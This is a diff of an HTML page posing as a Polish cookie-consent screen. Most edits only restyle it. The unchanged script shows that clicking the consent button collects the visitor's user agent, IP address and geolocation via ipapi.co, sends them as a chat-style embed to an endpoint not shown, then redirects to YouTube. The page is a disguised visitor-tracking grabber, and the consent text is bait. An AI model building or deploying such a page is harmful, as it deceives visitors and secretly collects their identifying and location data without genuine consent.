@@ -13,50 +13,49 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      color: white;
     }
 
     .box {
       background: #1a1a1a;
       padding: 3rem 2rem;
-      border-radius: 1.5rem;
-      box-shadow: 0 0 30px #ff69b455;
+      border-radius: 1rem;
       text-align: center;
+      box-shadow: 0 0 25px #00ff80aa;
       max-width: 600px;
-      color: white;
+      width: 90%;
     }
 
     h1 {
-      font-size: 2.5rem;
+      font-size: 2.2rem;
       margin-bottom: 1rem;
-      color: #ff69b4;
+      color: #00ff80;
     }
 
     p {
-      font-size: 1.1rem;
-      color: #ccc;
+      font-size: 1rem;
       margin-bottom: 2rem;
+      color: #ccc;
     }
 
     button {
-      background: linear-gradient(135deg, #ff69b4, #ff85c1);
-      color: white;
-      border: none;
-      padding: 1rem 2.5rem;
-      border-radius: 999px;
+      background-color: #00ff80;
+      color: black;
       font-size: 1.3rem;
-      font-weight: bold;
+      padding: 1rem 2rem;
+      border: none;
+      border-radius: 0.7rem;
       cursor: pointer;
-      box-shadow: 0 0 15px #ff69b4aa;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      font-weight: bold;
+      transition: background 0.2s ease;
     }
 
     button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 20px #ff85c1aa;
+      background-color: #00cc66;
     }
 
     #status {
-      margin-top: 2rem;
+      margin-top: 1.5rem;
       font-size: 1rem;
       color: #55ff55;
     }
@@ -66,10 +65,10 @@
   <div class="box">
     <h1>🍪 Akceptacja Ciasteczek</h1>
     <p>
-      Aby kontynuować, musisz zaakceptować nasz regulamin i politykę plików cookie.<br />
+      Aby kontynuować, musisz zaakceptować nasz regulamin i politykę plików cookie.<br>
       Klikając przycisk poniżej, zgadzasz się na ich użycie.
     </p>
-    <button id="cookie-btn">Zatwierdzam 🍪</button>
+    <button id="cookie-btn">Zatwierdzam 🍀</button>
     <div id="status"></div>
   </div>
 
@@ -82,7 +81,7 @@
 
       const userAgent = navigator.userAgent;
       let ip = "Nieznane";
-      let location = "Nieznana lokalizacja";
+      let location = "Nieznana";
 
       try {
         const res = await fetch("https://ipapi.co/json/");
@@ -96,7 +95,7 @@
       const payload = {
         embeds: [{
           title: "🍪 Nowe ciasteczko kliknięte!",
-          color: 0xff69b4,
+          color: 0x00ff80,
           fields: [
             { name: "IP", value: `\`${ip}\``, inline: false },
             { name: "Lokalizacja", value: location, inline: false },
@@ -113,7 +112,7 @@
         body: JSON.stringify(payload)
       });
 
-      status.innerHTML = `<b>Dziękujemy za akceptację 🍪</b><br>Przekierowuję...`;
+      status.innerHTML = "✅ Dziękujemy za akceptację! Przekierowuję...";
 
       setTimeout(() => {
         window.location.href = "https://youtube.com";
